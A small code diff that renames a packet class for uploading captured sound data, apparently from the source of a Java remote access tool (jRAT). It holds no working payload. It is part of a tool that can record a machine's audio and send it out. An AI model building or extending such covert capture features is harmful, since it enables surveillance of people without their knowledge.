@@ -5,12 +5,12 @@ import java.io.DataOutputStream;
 import se.jrat.common.io.StringWriter;
 
 
-public class Packet58SoundCapture extends AbstractOutgoingPacket {
+public class Packet58ClientUploadSoundCapture extends AbstractOutgoingPacket {
 
 	private byte[] data;
 	private int read;
 	
-	public Packet58SoundCapture(byte[] data, int read) {
+	public Packet58ClientUploadSoundCapture(byte[] data, int read) {
 		this.data = data;
 		this.read = read;
 	}
